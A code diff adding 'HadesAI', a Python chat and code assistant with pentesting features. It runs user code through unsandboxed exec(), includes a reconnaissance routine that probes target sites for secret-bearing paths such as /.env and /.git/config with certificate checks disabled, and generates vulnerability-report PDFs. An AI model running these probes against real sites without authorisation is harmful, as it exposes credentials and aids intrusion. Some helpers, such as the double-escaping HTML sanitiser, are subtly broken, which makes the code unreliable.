+                    modules = [alias.name for alias in node.names]
+                    explanations.append(f"📦 From {node.module} import {modules}")
+                elif isinstance(node, ast.Assign):
+                    targets = [ast.unparse(t) for t in node.targets]
+                    explanations.append(f"🔧 Variable(s) assigned: {targets}")
+            return "\n".join(explanations) if explanations else "ℹ️ No recognizable constructs to explain."
+        except Exception as e:
+            return f"❌ Explanation Error:\n{traceback.format_exc()}"
+    
+    def gpt_analyze(self, code_snippet: str, instruction: str = "Analyze and improve this code") -> str:
+        """Use GPT to analyze or modify code"""
+        if not HAS_OPENAI or not openai:
+            return "[GPT] OpenAI module not available. Install with: pip install openai"
+        
+        if not openai.api_key:
+            return "[GPT] No API key set. Set OPENAI_API_KEY environment variable."
+        
+        try:
+            response = openai.ChatCompletion.create(
+                model="gpt-3.5-turbo",
+                messages=[
+                    {"role": "system", "content": "You are an expert code assistant. Analyze code, find bugs, suggest improvements, and help with refactoring. Be concise and practical."},
+                    {"role": "user", "content": f"{instruction}:\n\n```python\n{code_snippet}\n```"}
+                ],
+                max_tokens=2000,
+                temperature=0.7
+            )
+            return response.choices[0].message.content
+        except Exception as e:
+            return f"[GPT ERROR] {e}"
+    
+    def gpt_modify(self, code_snippet: str, instruction: str) -> str:
+        """Use GPT to modify code based on instruction"""
+        if not HAS_OPENAI or not openai:
+            return self.apply_instruction_local(instruction)
+        
+        if not openai.api_key:
+            return self.apply_instruction_local(instruction)
+        
+        try:
+            response = openai.ChatCompletion.create(
+                model="gpt-3.5-turbo",
+                messages=[
+                    {"role": "system", "content": "You are a code modification assistant. Apply the user's instruction to modify the code. Return ONLY the modified code without explanations."},
+                    {"role": "user", "content": f"Apply this instruction to the code: {instruction}\n\nCode:\n```python\n{code_snippet}\n```\n\nReturn only the modified code."}
+                ],
+                max_tokens=2000,
+                temperature=0.3
+            )
+            return response.choices[0].message.content
+        except Exception as e:
+            return self.apply_instruction_local(instruction)
+    
+    def analyze_file_with_gpt(self, filename: str) -> str:
+        """Load a file and send each function to GPT for analysis"""
+        if filename not in self.files:
+            load_result = self.load_file(filename)
+            if "Failed" in load_result:
+                return load_result
+        
+        try:
+            code = self.files[filename]
+            tree = ast.parse(code)
+            results = []
+            
+            for node in tree.body:
+                if isinstance(node, ast.FunctionDef):
+                    func_code = ast.unparse(node)
+                    gpt_result = self.gpt_analyze(func_code, f"Review this function `{node.name}` for bugs, security issues, and improvements")
+                    results.append(f"--- GPT Analysis for `{node.name}` ---\n{gpt_result}")
+            
+            return "\n\n".join(results) if results else "[ℹ️] No functions to analyze."
+        except Exception as e:
+            return f"[❌] GPT Analysis Error:\n{traceback.format_exc()}"
+    
+    def apply_instruction_local(self, instruction: str) -> str:
+        """Apply instruction without GPT (fallback)"""
+        instruction_lower = instruction.lower()
+        
+        if "wrap in function" in instruction_lower:
+            indented = "\n".join("    " + line for line in self.current_code.splitlines())
+            return f"def wrapped_function():\n{indented}"
+        elif "remove print" in instruction_lower:
+            return "\n".join(line for line in self.current_code.splitlines() if "print" not in line.lower())
+        elif "add logging" in instruction_lower:
+            new_code = re.sub(r"def (\w+)\((.*?)\):", r"def \1(\2):\n    print(f'Entering \1')", self.current_code)
+            return new_code
+        elif "add error handling" in instruction_lower or "add try" in instruction_lower:
+            lines = self.current_code.splitlines()
+            indented = "\n".join("    " + line for line in lines)
+            return f"try:\n{indented}\nexcept Exception as e:\n    print(f'Error: {{e}}')"
+        elif "convert to async" in instruction_lower:
+            return self.current_code.replace("def ", "async def ").replace("return ", "return await ")
+        elif "add type hints" in instruction_lower:
+            return self.current_code.replace("def ", "def ").replace("(self)", "(self) -> None")
+        else:
+            return f"# Instruction not recognized locally. Install openai for GPT support.\n{self.current_code}"
+    
+    def apply_instruction(self, instruction: str) -> str:
+        """Apply instruction - uses GPT if available, falls back to local"""
+        if not self.current_code:
+            return "⚠️ No code loaded. Use set_code() first."
+        
+        if HAS_OPENAI and openai and openai.api_key:
+            return self.gpt_modify(self.current_code, instruction)
+        else:
+            return self.apply_instruction_local(instruction)
+    
+    def execute_code(self, code_str: str) -> str:
+        """Execute Python code and return output"""
+        try:
+            self.last_code = code_str
+            old_stdout = sys.stdout
+            sys.stdout = mystdout = StringIO()
+            exec(code_str, {"__builtins__": __builtins__}, {})
+            output = mystdout.getvalue()
+            sys.stdout = old_stdout
+            return f"✅ Code executed.\nOutput:\n{output.strip()}"
+        except Exception as e:
+            sys.stdout = sys.__stdout__
+            return f"❌ Execution Error:\n{traceback.format_exc()}"
+
+
+# ============================================================================
+# MAIN AI CLASS  
+# ============================================================================
+
+class HadesAI:
+    def __init__(self, knowledge_path: str = "hades_knowledge.db"):
+        self.kb = KnowledgeBase(knowledge_path)
+        self.proxy_manager = ProxyManager()
+        self.web_learner = WebLearner(self.kb)
+        self.chat_processor = ChatProcessor(self.kb)
+        self.exploitation = ExploitationEngine(self.proxy_manager)
+        self.request_injector = RequestInjector(self.proxy_manager)
+        self.auth_bypass = AuthBypass(self.proxy_manager)
+        self.current_state = {}
+        self.mode = 'chat'  # Modes: chat, code, explain
+        self.personality = "Doomcore Hyperlogic"
+        self.modules = {}
+        self.last_code = ""
+        self.files = {} # filename -> code str
+        self.code_assistant = CodeEditorAssistant()
+    def chat(self, message: str) -> Dict:
+        return self.chat_processor.process(message)
+        
+    def learn_from_url(self, url: str) -> Dict:
+        return self.web_learner.learn_from_url(url)
+        
+    def get_stats(self) -> Dict:
+        cursor = self.kb.conn.cursor()
+        stats = {}
+        for table in ['experiences', 'security_patterns', 'learned_exploits', 'threat_findings', 'cache_entries']:
+            cursor.execute(f'SELECT COUNT(*) FROM {table}')
+            stats[table] = cursor.fetchone()[0]
+        return stats
+    def dispatch(self, user_input):
+        """Dispatch commands - supports file operations, GPT analysis, and mode switching"""
+        user_input = user_input.strip()
+
+        # Mode switching
+        if user_input.startswith("::mode"):
+            _, new_mode = user_input.split(" ", 1)
+            self.mode = new_mode.strip()
+            return f"🔁 Mode switched to: {self.mode}"
+
+        # File operations
+        if user_input.startswith("::load"):
+            filename = user_input.split("::load", 1)[1].strip()
+            return self.code_assistant.load_file(filename)
+
+        if user_input.startswith("::save"):
+            filename = user_input.split("::save", 1)[1].strip()
+            return self.code_assistant.save_file(filename)
+
+        if user_input.startswith("::analyze"):
+            filename = user_input.split("::analyze", 1)[1].strip()
+            return self.code_assistant.analyze_file(filename)
+
+        if user_input.startswith("::edit"):
+            parts = user_input.split(" ", 2)
+            if len(parts) == 3:
+                filename = parts[1]
+                instruction = parts[2]
+                if filename in self.code_assistant.files:
+                    self.code_assistant.set_code(self.code_assistant.files[filename])
+                    result = self.code_assistant.apply_instruction(instruction)
+                    self.code_assistant.files[filename] = result
+                    return f"[🛠️] Applied instruction to {filename}:\n{result[:500]}..."
+                return "[⚠️] File not loaded. Use ::load filename first."
+            return "[⚠️] Usage: ::edit filename instruction"
+
+        # GPT code analysis
+        if user_input.startswith("::gpt"):
+            filename = user_input.split("::gpt", 1)[1].strip()
+            return self.code_assistant.analyze_file_with_gpt(filename)
+
+        if user_input.startswith("::gptfunc"):
+            filename = user_input.split("::gptfunc", 1)[1].strip()
+            return self.code_assistant.analyze_file_with_gpt(filename)
+
+        if user_input.startswith("::explain"):
+            code = user_input.split("::explain", 1)[1].strip()
+            if not code and self.code_assistant.current_code:
+                code = self.code_assistant.current_code
+            return self.code_assistant.explain_code(code)
+
+        if user_input.startswith("::exec"):
+            code = user_input.split("::exec", 1)[1].strip()
+            return self.code_assistant.execute_code(code)
+
+        # Help command
+        if user_input.lower() in ["::help", "help", "?"]:
+            return """🔥 **HADES AI - Code & Chat Commands:**
+
+**Mode Switching:**
+• `::mode chat` - Chat mode (default)
+• `::mode code` - Code execution mode
+• `::mode explain` - Code explanation mode
+• `::mode assist` - Code assistant mode
+
+**File Operations:**
+• `::load filename` - Load a file for editing
+• `::save filename` - Save changes to file
+• `::analyze filename` - Analyze file structure
+• `::edit filename instruction` - Apply instruction to file
+
+**GPT Analysis:**
+• `::gpt filename` - GPT analysis of file functions
+• `::gptfunc filename` - Same as ::gpt
+• `::explain code` - Explain code structure
+• `::exec code` - Execute Python code
+
+**Pentesting:** (in chat mode)
+• `scan https://target.com` - Full reconnaissance
+• `scan ports on IP` - Port scan
+• `vuln scan URL` - Vulnerability scan
+• `learn from URL` - Learn exploits from URL
+• `show stats` - View statistics
+"""
+
+        # Mode-based dispatch
+        if self.mode == 'code':
+            return self.handle_code_interpreter(user_input)
+        elif self.mode == 'explain':
+            return self.explain_code(user_input)
+        elif self.mode == 'assist':
+            return self.code_assistant_mode(user_input)
+        else:
+            return self.handle_chat(user_input)
+    def handle_chat(self, user_input):
+        return f"[HadesAI] ✒️ Echoing in {self.personality}: {user_input}"
+
+
+    def handle_code_interpreter(self, code_str):
+        try:
+            self.last_code = code_str # Save code for assist mode
+            old_stdout = sys.stdout
+            sys.stdout = mystdout = StringIO()
+            exec(code_str, {}, {})
+            output = mystdout.getvalue()
+            sys.stdout = old_stdout
+            return f"✅ Code executed.\nOutput:\n{output.strip()}"
+        except Exception as e:
+            sys.stdout = old_stdout
+            return f"❌ Execution Error:\n{traceback.format_exc()}"
+    def explain_code(self, code_str):
+        try:
+            tree = ast.parse(code_str)
+            explanations = []
+            for node in tree.body:
+                if isinstance(node, ast.FunctionDef):
+                    args = [arg.arg for arg in node.args.args]
+                    explanations.append(
+                        f"📘 Function `{node.name}` takes args: {args}"
+                    )
+                elif isinstance(node, ast.Import):
+                    modules = [alias.name for alias in node.names]
+                    explanations.append(f"📦 Imports modules: {modules}")
+                elif isinstance(node, ast.ImportFrom):
+                    modules = [alias.name for alias in node.names]
+                    explanations.append(f"📦 From {node.module} import {modules}")
+                elif isinstance(node, ast.Assign):
+                    targets = [ast.unparse(t) for t in node.targets]
+                    explanations.append(f"🔧 Variable(s) assigned: {targets}")
+            return "\n".join(explanations) if explanations else "ℹ️ No recognizable constructs to explain."
+        except Exception as e:
+            return f"❌ Explanation Error:\n{traceback.format_exc()}"
+
+    def code_assistant_mode(self, instruction):
+        """Handle assist mode - uses GPT if available for intelligent code modifications"""
+        if not self.last_code:
+            return "⚠️ No code loaded. Switch to ::mode code and provide code first."
+        try:
+            self.code_assistant.set_code(self.last_code)
+            result = self.code_assistant.apply_instruction(instruction)
+            return f"🛠️ Modified Code:\n{result}"
+        except Exception as e:
+            return f"❌ Assistant Error:\n{traceback.format_exc()}"
+    
+    def gpt_chat(self, message: str) -> str:
+        """Direct GPT chat for code-related questions"""
+        if not HAS_OPENAI or not openai or not openai.api_key:
+            return "GPT not available. Set OPENAI_API_KEY environment variable."
+        
+        try:
+            response = openai.ChatCompletion.create(
+                model="gpt-3.5-turbo",
+                messages=[
+                    {"role": "system", "content": "You are HADES, an expert security and coding assistant. Help with pentesting, code analysis, and security questions."},
+                    {"role": "user", "content": message}
+                ],
+                max_tokens=2000,
+                temperature=0.7
+            )
+            return response.choices[0].message.content
+        except Exception as e:
+            return f"GPT Error: {e}"
+    def full_site_scan(self, url: str, callback=None) -> Dict[str, Any]:
+        """
+        Comprehensive automated reconnaissance on a target URL.
+        Runs multiple scan types and learns from findings.
+        """
+        import urllib.parse
+        from datetime import datetime
+        
+        results = {
+            'target': url,
+            'started_at': datetime.now().isoformat(),
+            'scans_completed': [],
+            'findings': [],
+            'exploits_learned': 0,
+            'vulnerabilities': [],
+            'status': 'running'
+        }
+        
+        def log(msg):
+            if callback:
+                callback(msg)
+            results['scans_completed'].append(msg)
+        
+        try:
+            parsed = urllib.parse.urlparse(url)
+            domain = parsed.netloc or parsed.path.split('/')[0]
+            base_url = f"{parsed.scheme}://{domain}" if parsed.scheme else f"https://{domain}"
+            
+            log(f"🎯 Starting full reconnaissance on {domain}")
+            
+            # 1. Learn from the URL itself
+            log("📚 Phase 1: Learning from target URL...")
+            learn_result = self.learn_from_url(url)
+            if learn_result.get('exploits_learned', 0) > 0:
+                results['exploits_learned'] += learn_result['exploits_learned']
+                log(f"   ✓ Learned {learn_result['exploits_learned']} exploit patterns")
+            else:
+                log("   ✓ URL analyzed (no exploits found)")
+            
+            # 2. Check for common vulnerability paths
+            log("🔍 Phase 2: Checking common vulnerability paths...")
+            vuln_paths = [
+                '/robots.txt', '/.git/config', '/.env', '/wp-config.php.bak',
+                '/admin', '/login', '/api', '/graphql', '/.well-known/security.txt',
+                '/swagger.json', '/api-docs', '/debug', '/trace', '/server-status'
+            ]
+            
+            if HAS_REQUESTS:
+                session = self.proxy_manager.get_session()
+                for path in vuln_paths[:10]:
+                    try:
+                        test_url = f"{base_url}{path}"
+                        r = session.get(test_url, timeout=5, verify=False, allow_redirects=False)
+                        if r.status_code == 200:
+                            finding = {
+                                'type': 'exposed_path',
+                                'path': path,
+                                'url': test_url,
+                                'status': r.status_code,
+                                'severity': 'MEDIUM' if path in ['/.git/config', '/.env'] else 'LOW'
+                            }
+                            results['vulnerabilities'].append(finding)
+                            log(f"   ⚠️ Found: {path} (Status: {r.status_code})")
+                            
+                            # Store as threat finding
+                            self.kb.store_threat_finding(ThreatFinding(
+                                path=test_url,
+                                threat_type='exposed_path',
+                                pattern=path,
+                                severity=finding['severity'],
+                                code_snippet=r.text[:200] if r.text else '',
+                                browser='HADES_SCAN',
+                                context=f"Exposed path found during automated scan"
+                            ))
+                    except:
+                        pass
+            
+            # 3. Header analysis
+            log("🔒 Phase 3: Analyzing security headers...")
+            if HAS_REQUESTS:
+                try:
+                    session = self.proxy_manager.get_session()
+                    r = session.get(base_url, timeout=10, verify=False)
+                    headers = r.headers
+                    
+                    security_headers = {
+                        'X-Frame-Options': 'Clickjacking protection',
+                        'X-Content-Type-Options': 'MIME sniffing protection',
+                        'X-XSS-Protection': 'XSS filter',
+                        'Content-Security-Policy': 'CSP protection',
+                        'Strict-Transport-Security': 'HTTPS enforcement',
+                        'X-Permitted-Cross-Domain-Policies': 'Flash/PDF policy'
+                    }
+                    
+                    missing_headers = []
+                    for header, desc in security_headers.items():
+                        if header not in headers:
+                            missing_headers.append(header)
+                            results['vulnerabilities'].append({
+                                'type': 'missing_header',
+                                'header': header,
+                                'description': desc,
+                                'severity': 'LOW'
+                            })
+                    
+                    if missing_headers:
+                        log(f"   ⚠️ Missing security headers: {', '.join(missing_headers[:3])}...")
+                    else:
+                        log("   ✓ Security headers look good")
+                        
+                except Exception as e:
+                    log(f"   ✗ Header analysis failed: {str(e)[:50]}")
+            
+            # 4. Try to learn from related security resources
+            log("📖 Phase 4: Learning from security databases...")
+            security_urls = [
+                f"https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword={domain}",
+            ]
+            
+            for sec_url in security_urls[:1]:
+                try:
+                    learn_result = self.learn_from_url(sec_url)
+                    if learn_result.get('exploits_learned', 0) > 0:
+                        results['exploits_learned'] += learn_result['exploits_learned']
+                        log(f"   ✓ Learned {learn_result['exploits_learned']} from security database")
+                except:
+                    pass
+            
+            # 5. Form detection and analysis
+            log("📝 Phase 5: Detecting forms and input fields...")
+            if HAS_REQUESTS:
+                try:
+                    session = self.proxy_manager.get_session()
+                    r = session.get(url, timeout=10, verify=False)
+                    
+                    # Simple form detection
+                    form_count = r.text.lower().count('<form')
+                    input_count = r.text.lower().count('<input')
+                    
+                    if form_count > 0:
+                        log(f"   ✓ Found {form_count} forms with {input_count} input fields")
+                        results['vulnerabilities'].append({
+                            'type': 'form_detected',
+                            'forms': form_count,
+                            'inputs': input_count,
+                            'severity': 'INFO',
+                            'note': 'Forms detected - potential XSS/SQLi targets'
+                        })
+                except:
+                    pass
+            
+            results['completed_at'] = datetime.now().isoformat()
+            results['status'] = 'completed'
+            results['total_vulnerabilities'] = len(results['vulnerabilities'])
+            
+            log(f"✅ Scan complete! Found {len(results['vulnerabilities'])} potential issues")
+            
+        except Exception as e:
+            results['status'] = 'error'
+            results['error'] = str(e)
+            log(f"❌ Scan error: {str(e)}")
+        
+        return results
+    
+    def export_exploits_to_pdf(self, filepath: str, clear_after: bool = False) -> Dict[str, Any]:
+        if not HAS_REPORTLAB:
+            return {'success': False, 'error': 'reportlab not installed. Run: pip install reportlab'}
+        
+        try:
+            exploits = self.kb.get_all_learned_exploits()
+            findings = self.kb.get_threat_findings(500)
+            patterns = self.kb.get_patterns()
+            stats = self.get_stats()
+            
+            doc = SimpleDocTemplate(filepath, pagesize=A4, 
+                                   rightMargin=0.5*inch, leftMargin=0.5*inch,
+                                   topMargin=0.5*inch, bottomMargin=0.5*inch)
+            
+            styles = getSampleStyleSheet()
+            title_style = ParagraphStyle('Title', parent=styles['Heading1'], 
+                                        fontSize=24, textColor=colors.HexColor('#e94560'),
+                                        alignment=TA_CENTER, spaceAfter=30)
+            heading_style = ParagraphStyle('Heading', parent=styles['Heading2'],
+                                          fontSize=16, textColor=colors.HexColor('#0f3460'),
+                                          spaceBefore=20, spaceAfter=10)
+            subheading_style = ParagraphStyle('SubHeading', parent=styles['Heading3'],
+                                             fontSize=12, textColor=colors.HexColor('#e94560'),
+                                             spaceBefore=15, spaceAfter=5)
+            code_style = ParagraphStyle('Code', parent=styles['Code'],
+                                       fontSize=8, fontName='Courier',
+                                       backColor=colors.HexColor('#f5f5f5'),
+                                       leftIndent=10, rightIndent=10,
+                                       spaceBefore=5, spaceAfter=10)
+            normal_style = styles['Normal']
+            label_style = ParagraphStyle('Label', parent=normal_style, 
+                                        fontSize=9, textColor=colors.HexColor('#0f3460'),
+                                        fontName='Helvetica-Bold', spaceBefore=8)
+            impact_style = ParagraphStyle('Impact', parent=normal_style,
+                                         fontSize=9, leftIndent=15, 
+                                         textColor=colors.HexColor('#333333'))
+            
+            elements = []
+            
+            # ========== RESPONSIBLE DISCLOSURE HEADER ==========
+            elements.append(Paragraph("SECURITY VULNERABILITY REPORT", title_style))
+            elements.append(Spacer(1, 10))
+            
+            disclosure_text = """
+            <b>RESPONSIBLE DISCLOSURE NOTICE</b><br/><br/>
+            This report discloses security vulnerabilities identified through automated analysis 
+            and manual review. This submission is made under responsible disclosure guidelines. 
+            The findings contained herein are provided for authorized security testing and 
+            remediation purposes only.<br/><br/>
+            <b>Report ID:</b> HADES-{report_id}<br/>
+            <b>Generated:</b> {timestamp}<br/>
+            <b>Classification:</b> Security Assessment Report
+            """.format(
+                report_id=hashlib.sha256(datetime.now().isoformat().encode()).hexdigest()[:12].upper(),
+                timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')
+            )
+            elements.append(Paragraph(disclosure_text, normal_style))
+            elements.append(Spacer(1, 20))
+            
+            # ========== EXECUTIVE SUMMARY ==========
+            elements.append(Paragraph("1. Executive Summary", heading_style))
+            
+            severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
+            for f in findings:
+                sev = f.get('severity', 'LOW')
+                if sev in severity_counts:
+                    severity_counts[sev] += 1
+                    
+            summary_text = f"""
+            This automated security assessment identified <b>{len(findings)} potential vulnerabilities</b> 
+            and learned <b>{len(exploits)} exploit patterns</b> from various sources.<br/><br/>
+            <b>Severity Breakdown:</b><br/>
+            • Critical: {severity_counts['CRITICAL']}<br/>
+            • High: {severity_counts['HIGH']}<br/>
+            • Medium: {severity_counts['MEDIUM']}<br/>
+            • Low: {severity_counts['LOW']}
+            """
+            elements.append(Paragraph(summary_text, normal_style))
+            
+            stats_data = [
+                ['Metric', 'Count', 'Risk Level'],
+                ['Exploits Learned', str(len(exploits)), 'Info'],
+                ['Threat Findings', str(len(findings)), 'High' if len(findings) > 10 else 'Medium'],
+                ['Security Patterns', str(stats.get('security_patterns', 0)), 'Info'],
+                ['Cache Entries Analyzed', str(stats.get('cache_entries', 0)), 'Info'],
+            ]
+            stats_table = Table(stats_data, colWidths=[2.5*inch, 1.5*inch, 1.5*inch])
+            stats_table.setStyle(TableStyle([
+                ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#0f3460')),
+                ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
+                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
+                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
+                ('FONTSIZE', (0, 0), (-1, 0), 11),
+                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
+                ('BACKGROUND', (0, 1), (-1, -1), colors.HexColor('#f5f5f5')),
+                ('GRID', (0, 0), (-1, -1), 1, colors.HexColor('#cccccc')),
+            ]))
+            elements.append(Spacer(1, 15))
+            elements.append(stats_table)
+            elements.append(PageBreak())
+            
+            # ========== DETAILED VULNERABILITY FINDINGS ==========
+            if findings:
+                elements.append(Paragraph("2. Detailed Vulnerability Findings", heading_style))
+                elements.append(Paragraph(
+                    "Each finding below includes reproduction steps, impact analysis, and evidence.",
+                    normal_style
+                ))
+                elements.append(Spacer(1, 15))
+                
+                # Impact descriptions for each vulnerability type
+                impact_map = {
+                    'eval_code': {
+                        'impact': 'Remote Code Execution (RCE) - An attacker could execute arbitrary code on the client or server.',
+                        'cvss': '9.8 (Critical)',
+                        'cwe': 'CWE-94: Improper Control of Generation of Code',
+                        'confidentiality': 'HIGH - Complete system compromise possible',
+                        'integrity': 'HIGH - Arbitrary code execution allows data modification',
+                        'availability': 'HIGH - System can be crashed or made unavailable'
+                    },
+                    'injection': {
+                        'impact': 'Cross-Site Scripting (XSS) - Attacker can inject malicious scripts that execute in victim browsers.',
+                        'cvss': '6.1-7.5 (Medium-High)',
+                        'cwe': 'CWE-79: Cross-site Scripting',
+                        'confidentiality': 'MEDIUM - Session tokens and cookies can be stolen',
+                        'integrity': 'MEDIUM - Page content can be modified',
+                        'availability': 'LOW - Limited DoS through script loops'
+                    },
+                    'data_exfil': {
+                        'impact': 'Data Exfiltration - Sensitive data including cookies and storage can be accessed/stolen.',
+                        'cvss': '7.5 (High)',
+                        'cwe': 'CWE-200: Exposure of Sensitive Information',
+                        'confidentiality': 'HIGH - User data and credentials at risk',
+                        'integrity': 'LOW - Data read but not modified',
+                        'availability': 'NONE'
+                    },
+                    'obfuscation': {
+                        'impact': 'Code Obfuscation - Potentially malicious code hidden using encoding techniques.',
+                        'cvss': '5.0-7.0 (Medium)',
+                        'cwe': 'CWE-506: Embedded Malicious Code',
+                        'confidentiality': 'MEDIUM - Hidden functionality may steal data',
+                        'integrity': 'MEDIUM - Obfuscated code may modify behavior',
+                        'availability': 'LOW'
+                    },
+                    'malware': {
+                        'impact': 'Malware Indicator - File contains patterns consistent with known malware.',
+                        'cvss': '9.0+ (Critical)',
+                        'cwe': 'CWE-506: Embedded Malicious Code',
+                        'confidentiality': 'HIGH - Complete compromise',
+                        'integrity': 'HIGH - System modifications',
+                        'availability': 'HIGH - Ransomware/DoS possible'
+                    },
+                    'exploit': {
+                        'impact': 'Exploit Code - Active exploitation attempt or exploit payload detected.',
+                        'cvss': '8.0-10.0 (High-Critical)',
+                        'cwe': 'CWE-20: Improper Input Validation',
+                        'confidentiality': 'HIGH',
+                        'integrity': 'HIGH',
+                        'availability': 'HIGH'
+                    },
+                    'backdoor': {
+                        'impact': 'Backdoor/C2 - Command and control or persistent access mechanism detected.',
+                        'cvss': '9.8 (Critical)',
+                        'cwe': 'CWE-506: Embedded Malicious Code',
+                        'confidentiality': 'HIGH - Remote access to system',
+                        'integrity': 'HIGH - Full control',
+                        'availability': 'HIGH'
+                    },
+                    'crypto': {
+                        'impact': 'Cryptominer/Crypto - Cryptocurrency-related code that may indicate cryptojacking.',
+                        'cvss': '5.0-6.0 (Medium)',
+                        'cwe': 'CWE-400: Uncontrolled Resource Consumption',
+                        'confidentiality': 'LOW',
+                        'integrity': 'LOW',
+                        'availability': 'MEDIUM - Resource consumption'
+                    }
+                }
+                
+                for idx, f in enumerate(findings[:30], 1):
+                    threat_type = f.get('threat_type', 'unknown')
+                    impact_info = impact_map.get(threat_type, {
+                        'impact': 'Potential security issue detected.',
+                        'cvss': 'TBD',
+                        'cwe': 'TBD',
+                        'confidentiality': 'TBD',
+                        'integrity': 'TBD',
+                        'availability': 'TBD'
+                    })
+                    
+                    # Extract domain/context from path
+                    path_parts = f['path'].replace('\\', '/').split('/')
+                    domain_context = 'Unknown'
+                    for part in path_parts:
+                        if '.' in part and len(part) > 4:
+                            domain_context = part
+                            break
+                    
+                    # Finding header with verification status
+                    sev_color = {'HIGH': '#e94560', 'MEDIUM': '#ffa500', 'LOW': '#4CAF50'}.get(f['severity'], '#666')
+                    elements.append(Paragraph(
+                        f"<b>Finding #{idx}: {threat_type.upper().replace('_', ' ')}</b> "
+                        f"<font color='{sev_color}'>[{f['severity']}]</font>",
+                        subheading_style
+                    ))
+                    
+                    # ========== VERIFICATION STATUS ==========
+                    elements.append(Paragraph("<b>Verification Status:</b>", label_style))
+                    verification_table = Table([
+                        ['Status', 'Automated Detection - Manual Verification Recommended'],
+                        ['Confidence', f"{f['severity']} confidence based on pattern matching"],
+                        ['Validated', 'Pending manual confirmation'],
+                    ], colWidths=[1.2*inch, 4.5*inch])
+                    verification_table.setStyle(TableStyle([
+                        ('FONTSIZE', (0, 0), (-1, -1), 8),
+                        ('BACKGROUND', (0, 0), (0, -1), colors.HexColor('#f0f0f0')),
+                        ('FONTNAME', (0, 0), (0, -1), 'Helvetica-Bold'),
+                        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor('#cccccc')),
+                        ('VALIGN', (0, 0), (-1, -1), 'TOP'),
+                    ]))
+                    elements.append(verification_table)
+                    elements.append(Spacer(1, 5))
+                    
+                    # ========== EXPLOIT CONTEXT ==========
+                    elements.append(Paragraph("<b>Exploit Context:</b>", label_style))
+                    context_text = f"""
+                    <b>Target Domain/Application:</b> {domain_context}<br/>
+                    <b>Affected Component:</b> Browser cache / Cached web content<br/>
+                    <b>Input Vector:</b> {f.get('pattern', 'Pattern-based detection')[:50]}<br/>
+                    <b>Attack Surface:</b> Client-side cached JavaScript/HTML<br/>
+                    <b>Discovery Method:</b> Automated cache analysis by HADES AI
+                    """
+                    elements.append(Paragraph(context_text, impact_style))
+                    
+                    # ========== AFFECTED ASSET ==========
+                    elements.append(Paragraph("<b>Affected Asset:</b>", label_style))
+                    elements.append(Paragraph(f"<b>Full Path:</b> {f['path']}", impact_style))
+                    elements.append(Paragraph(f"<b>Browser:</b> {f['browser']}", impact_style))
+                    elements.append(Paragraph(f"<b>Detected:</b> {f.get('detected_at', 'N/A')[:19]}", impact_style))
+                    
+                    # ========== SECURITY CONTEXT (CWE/CVSS) ==========
+                    elements.append(Paragraph("<b>Security Context:</b>", label_style))
+                    security_table = Table([
+                        ['CVSS Score', 'CWE ID', 'OWASP Category'],
+                        [impact_info['cvss'], impact_info['cwe'], self._get_owasp_category(threat_type)],
+                    ], colWidths=[2*inch, 2.5*inch, 2*inch])
+                    security_table.setStyle(TableStyle([
+                        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#0f3460')),
+                        ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
+                        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
+                        ('FONTSIZE', (0, 0), (-1, -1), 8),
+                        ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
+                        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor('#cccccc')),
+                        ('BACKGROUND', (0, 1), (-1, -1), colors.HexColor('#f5f5f5')),
+                    ]))
+                    elements.append(security_table)
+                    elements.append(Spacer(1, 5))
+                    
+                    # ========== IMPACT DESCRIPTION ==========
+                    elements.append(Paragraph("<b>Impact Description:</b>", label_style))
+                    elements.append(Paragraph(f"<b>Summary:</b> {impact_info['impact']}", impact_style))
+                    impact_detail = f"""
+                    <b>Potential Damage:</b><br/>
+                    • <b>Data Theft:</b> {self._get_data_theft_risk(threat_type)}<br/>
+                    • <b>Session Hijack:</b> {self._get_session_risk(threat_type)}<br/>
+                    • <b>Remote Code Execution:</b> {self._get_rce_risk(threat_type)}<br/>
+                    • <b>Lateral Movement:</b> {self._get_lateral_risk(threat_type)}
+                    """
+                    elements.append(Paragraph(impact_detail, impact_style))
+                    
+                    # CIA Impact
+                    elements.append(Paragraph("<b>CIA Triad Impact:</b>", label_style))
+                    elements.append(Paragraph(f"• <b>Confidentiality:</b> {impact_info['confidentiality']}", impact_style))
+                    elements.append(Paragraph(f"• <b>Integrity:</b> {impact_info['integrity']}", impact_style))
+                    elements.append(Paragraph(f"• <b>Availability:</b> {impact_info['availability']}", impact_style))
+                    
+                    # ========== EVIDENCE / CODE SNIPPET ==========
+                    elements.append(Paragraph("<b>Evidence (Code Snippet):</b>", label_style))
+                    elements.append(Paragraph(
+                        "<i>The following code was extracted from the cached file:</i>",
+                        ParagraphStyle('Italic', parent=impact_style, fontSize=8, textColor=colors.gray)
+                    ))
+                    code_snippet = f.get('code_snippet', 'N/A')[:400]
+                    code_snippet = code_snippet.replace('<', '&lt;').replace('>', '&gt;').replace('&', '&amp;')
+                    elements.append(Paragraph(f"<font face='Courier' size='7'>{code_snippet}</font>", code_style))
+                    
+                    # Screenshot placeholder
+                    elements.append(Paragraph("<b>Screenshot Evidence:</b>", label_style))
+                    elements.append(Paragraph(
+                        f"[ATTACH SCREENSHOT: evidence_finding_{idx}.png]<br/>"
+                        "<i>Capture browser DevTools showing the malicious code execution or network request.</i>",
+                        ParagraphStyle('Placeholder', parent=impact_style, fontSize=8, 
+                                      textColor=colors.HexColor('#888888'), backColor=colors.HexColor('#f9f9f9'))
+                    ))
+                    
+                    # ========== DETAILED REPRODUCTION STEPS ==========
+                    elements.append(Paragraph("<b>Reproduction Steps:</b>", label_style))
+                    repro_steps = f"""
+                    <b>Prerequisites:</b><br/>
+                    • Browser with cache enabled (same browser as affected: {f['browser']})<br/>
+                    • Network proxy tool (Burp Suite/OWASP ZAP) for traffic analysis<br/>
+                    • Text editor or hex viewer for cache file inspection<br/><br/>
+                    
